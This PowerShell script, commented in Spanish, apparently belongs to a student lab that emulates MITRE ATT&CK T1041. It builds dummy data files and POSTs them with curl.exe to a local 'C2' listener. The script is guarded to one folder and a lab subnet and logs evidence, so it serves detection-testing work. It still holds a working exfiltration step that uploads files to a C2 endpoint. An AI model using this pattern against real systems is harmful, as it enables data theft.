# ATA074 - T1041 Exfiltration Over C2 Channel (Windows)
# Fuente ART: T1041 "C2 Data Exfiltration" (guid d1253f6e-c29b-49dc-b466-2147a6191932).
# Adaptacion declarada: executor Invoke-WebRequest -> curl.exe nativo de Windows 10
# para anclar el proceso por win_image; la accion es la misma (POST de un fichero al C2 local).
# Guardarrail: todo bajo C:\lab-attack\ATA074\; destino 192.168.65.0/24.
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
if ($dir -notlike 'C:\lab-attack\ATA074*') { Write-Error 'GUARDARRAIL: carpeta no permitida'; exit 2 }
$ev = Join-Path $dir 'evidencias'
New-Item -ItemType Directory -Force -Path $ev | Out-Null
$datos = Join-Path $dir 'datos'
New-Item -ItemType Directory -Force -Path $datos | Out-Null
$sink = '192.168.65.1'
$port = 9090
if ($sink -notlike '192.168.65.*') { 'GUARDARRAIL: destino no permitido' | Out-File (Join-Path $ev 'efecto_local.txt') -Encoding ascii; exit 2 }
1..20 | ForEach-Object { Set-Content -Path (Join-Path $datos ("exfil_$_.txt")) -Value ("TFG exfil $_ " + ('A' * 64)) -Encoding ascii }
$files = Get-ChildItem $datos -File
if ($files.Count -gt 200) { Write-Error 'GUARDARRAIL: demasiados ficheros'; exit 2 }
$payload = Join-Path $dir 'payload.txt'
$files | ForEach-Object { Get-Content $_.FullName } | Set-Content -Path $payload -Encoding ascii
if ((Get-Item $payload).Length -gt 67108864) { Write-Error 'GUARDARRAIL: payload > 64 MiB'; exit 2 }
$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$url = "http://$sink`:$port/upload/ATA074"
$curl = Join-Path $env:SystemRoot 'System32\curl.exe'
$status = ''
try {
    $out = & $curl -s -S -X POST --data-binary "@$payload" $url 2>&1
    $status = "curl_rc=$LASTEXITCODE out=$($out -join ' ')"
} catch {
    $status = "ERROR=$($_.Exception.Message)"
}
$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$sha = (Get-FileHash $payload -Algorithm SHA256).Hash.ToLower()
@(
    "ata=ATA074", "tecnica=T1041", "fuente=ART_adaptado",
    "guid=d1253f6e-c29b-49dc-b466-2147a6191932",
    "t0=$t0", "t1=$t1", "url=$url", "payload=$payload",
    "bytes=$((Get-Item $payload).Length)", "sha256=$sha", "resultado=$status"
) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
exit 0
